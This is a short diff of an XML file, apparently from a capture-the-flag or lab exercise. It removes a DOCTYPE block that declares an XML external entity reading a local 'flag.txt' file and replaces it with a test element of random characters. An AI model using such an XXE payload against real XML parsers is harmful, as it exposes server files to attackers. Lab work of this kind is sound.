@@ -1,13 +1,3 @@
 <?xml version="1.0" encoding="utf-8"?>
 
-<!DOCTYPE demo [
-
-    <!ELEMENT demo ANY >
-
-    <!ENTITY % extentity "<!ENTITY stolendata SYSTEM ?file://home/ubuntu/xxe2/flag.txt'>">
-
-    %extentity;
-
-    ]
-
->
+<test>hDIAFFDHGLPEHGTU<>"?AGLRPT;N,L
